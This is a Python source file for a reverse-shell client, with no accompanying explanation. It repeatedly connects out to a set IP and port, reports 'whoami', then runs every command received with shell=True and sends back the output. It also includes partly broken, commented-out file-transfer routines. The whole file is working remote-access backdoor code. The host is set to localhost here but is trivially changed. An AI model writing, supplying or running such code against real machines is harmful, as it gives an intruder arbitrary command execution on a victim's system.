import socket, subprocess, time, os

try:
    port = 6666
    ip = '127.0.0.1'

    def command(cmd):
           runcmd = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
           return (runcmd.stdout.read() + runcmd.stderr.read()).decode("utf-8")

    def connection():
        global s
        connected = False
        s = socket.socket()
        while not connected:
            try:
                s.connect( ( ip, port ) )
                s.send(command('whoami').encode())
                connected = True
            except socket.error:
                time.sleep( 2 )

    # def send_file():
    #     separator = "<SEPARATOR>"
    #     buffer = 4096
    #     filename = fd.askopenfilename()
    #     filesize = os.path.getsize(filename)
    #     s.send(f"{filename}{separator}{filesize}".encode())
    #     with open(filename, "rb") as f:
    #         while True:
    #         bytes_read = f.read(buffer)
    #         if not bytes_read:
    #             break
    #         c.sendall(bytes_read)
    #         progress.update(len(bytes_read))

    def receive_file():
        separator = "<SEPARATOR>"
        buffer = 4096
        received = s.recv(buffer).decode()
        filename, filesize = received.split(separator)
        filename = os.path.basename(filename)
        filesize = int(filesize)
        last_byte = ''
        with open(filename, "wb") as f:
            while True:
                try:
                    last_byte = bytes_read[-1]
                except:
                    pass
                bytes_read = s.recv(buffer)
                if last_byte == bytes_read[-1]:
                    break
                f.write(bytes_read)

    connection()
    while True:
        try:
            instructions = s.recv(1024).decode()
            if instructions == '!upload':
                # receive_file()
                # print('finished')
                pass
            else:
                cmand = command(instructions)
                time.sleep(1)
                s.send(('\n' + cmand).encode())
        except socket.error:
            connection()

except KeyboardInterrupt:
    s.close()
